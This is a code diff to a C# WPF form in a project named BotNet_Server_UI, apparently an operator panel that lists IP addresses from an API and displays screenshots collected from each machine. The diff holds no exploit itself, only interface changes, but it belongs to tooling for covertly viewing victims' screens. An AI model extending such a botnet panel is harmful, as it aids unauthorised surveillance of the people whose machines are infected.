@@ -26,11 +26,16 @@ namespace BotNet_Server_UI
             InitializeComponent();
         }
 
+        List<IP> ip = new List<IP>();
         private async void ScrForm_Loaded(object sender, RoutedEventArgs e)
         {
             List<Button> buttons = new List<Button>();
-            List<IP> ip = new List<IP>();
+            linkarrip:
             IP[] arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
+            if (arr == null)
+            {
+                goto linkarrip;
+            }
             for (int j = 0; j < arr.Length; j++)
             {
                 if (arr[j].ip == "")
@@ -45,9 +50,10 @@ namespace BotNet_Server_UI
             }
             for (int i = 0; i < ip.Count; i++)
             {
+                string name = Convert.ToString(ip[i].id);
                 buttons.Add(new Button()
                 {
-                    Name = Convert.ToString(ip[i].id),
+                    Name = "b" + name,
                     Content = "Скриншоты " + ip[i].ip
                 });
                 buttons[i].Click += Screens_Click;
@@ -59,8 +65,8 @@ namespace BotNet_Server_UI
         {
             var element = e.OriginalSource as FrameworkElement;
             var name = element?.Name;
-            var screen = await ApiRequest.GetProductAsync<Screen>("/api/v1/screens/" + name);
-            ScreenBox screenBox = new ScreenBox(screen.bytes);
+            var screen = await ApiRequest.GetProductAsync<Screen>("/api/v1/screens/" + name.Remove(0,1));
+            ScreenBox screenBox = new ScreenBox(screen.screens);
             screenBox.Show();
         }
     }
